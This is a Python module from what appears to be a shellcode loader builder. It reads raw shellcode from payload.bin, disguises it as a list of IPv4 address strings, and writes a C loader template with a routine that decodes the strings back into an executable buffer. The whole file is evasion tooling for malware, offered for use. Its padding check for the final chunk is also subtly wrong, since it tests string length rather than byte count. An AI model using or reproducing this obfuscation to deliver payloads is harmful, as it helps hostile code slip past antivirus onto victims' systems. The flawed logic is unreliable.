import random

def desc():
    return "IPV4Fuscation"

def getPayload():
    filename = './payload.bin'
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return file_content
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise
    
def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def shellcode_to_ipv4(data):
    ip_addresses = []

    # Split the data into chunks of 4 bytes
    for i in range(0, len(data), 4):
        ip = '.'.join(str(byte) for byte in data[i:i+4])
        ip_addresses.append(ip)

    # Check if the last chunk is not 4 bytes long
    if len(ip_addresses[-1]) < 4:
        missing_b = 4 - len(ip_addresses[-1])
        ip_addresses[-1] += '.' + '.'.join(str(random.randint(0, 255)) for _ in range(missing_b))

    return ip_addresses

def create_ips_string(ips):
    ips_str = ""
    # Create the string with the IP addresses, for every 4 ips add a new line and a tab
    for i, ip in enumerate(ips):
        ips_str += f"\"{ip}\", "
        if (i+1) % 3 == 0:
            # If its the last IP address, don't add a new line
            if i != len(ips) - 1:
                ips_str += "\n\t"
            
    # Remove the last comma
    ips_str = ips_str[:-2]

    return ips_str

def fill_template(obfuscated, original_data_size, num_ips):
    libs = f"#define SHELLCODE_SIZE	{original_data_size}\n#define NUM_IPS			{num_ips}"
    functions = ''' \
// Deobfuscate the shellcode
VOID DeobfuscateShellcode(unsigned char *ObsShellcode[], PBYTE DeobsShellcode) {
    for (int i = 0; i < NUM_IPS; i++) {
        // Parse IP address
        int octet = 0;
        int octetCount = 0;
        for (char *ptr = ObsShellcode[i]; *ptr != '\0'; ptr++) {
            if (*ptr == '.') {
                *DeobsShellcode++ = (BYTE)octet;
                octet = 0;
                octetCount++;
            } else {
                octet = octet * 10 + (*ptr - '0');
            }
        }
        if (octetCount == 3) {
            *DeobsShellcode++ = (BYTE)octet; // Add the last octet
        }
    }
}
'''

    payload_mods = ''' \
    SIZE_T      	sPayloadSize	= SHELLCODE_SIZE;

    // Allocating buffer to hold decrypted shellcode
    PBYTE pShellcode = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy encrypted shellcode to decrypted shellcode buffer
    if (pShellcode)
        memcpy(pShellcode, pPayload, sPayloadSize);

    // Deobfuscation
    DeobfuscateShellcode(pPayload, pShellcode);
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("const unsigned char pPayload[] = {", "unsigned char *pPayload[] = {") \
                              .replace("{{PAYLOAD}}", obfuscated) \
                              .replace("{{PAYLOAD_MODS}}", payload_mods)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

def run():
    original_data = getPayload()

    # Number of bytes in the original data
    original_data_size = len(original_data)

    # Convert the original data to IPv4 format
    obfuscated_data = shellcode_to_ipv4(bytearray(original_data))

    # Create the string with the IP addresses
    ips_str = create_ips_string(obfuscated_data)

    # Fill template
    fill_template(ips_str, str(original_data_size), len(obfuscated_data))

    return